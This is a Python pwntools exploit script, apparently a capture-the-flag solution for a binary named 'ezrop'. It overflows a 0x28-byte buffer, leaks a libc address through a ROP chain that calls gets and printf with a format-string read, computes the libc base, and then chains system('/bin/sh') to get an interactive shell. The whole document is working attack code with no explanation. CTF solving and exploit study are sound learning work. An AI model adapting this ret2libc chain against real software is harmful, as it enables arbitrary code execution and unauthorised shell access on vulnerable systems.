from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'

io = process('./ezrop_patched')
#io = process("./test")
#io = remote("localhost", 2727)
#io = remote("10.212.138.23", 43430)

io.recvuntil(b"name:")

elf = ELF('ezrop')
libc = ELF('libc.so.6')

rop = ROP(elf)

rop.raw('B'*0x28)
pause()
rop.gets()
rop.printf()
rop.raw(rop.ret)
rop.main()

io.sendline(rop.chain())

io.sendline("%3$p")
io.recv()
addr = int(io.recvS()[:len("0x7f7bac1e1a80")], 16)
print(hex(addr))

libc.address = addr - libc.sym['_IO_2_1_stdin_']
log.success("LIBC BASE: " + hex(libc.address))

rop = ROP(libc)
rop.raw('B'*0x28)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))

io.sendline(rop.chain())
io.interactive()
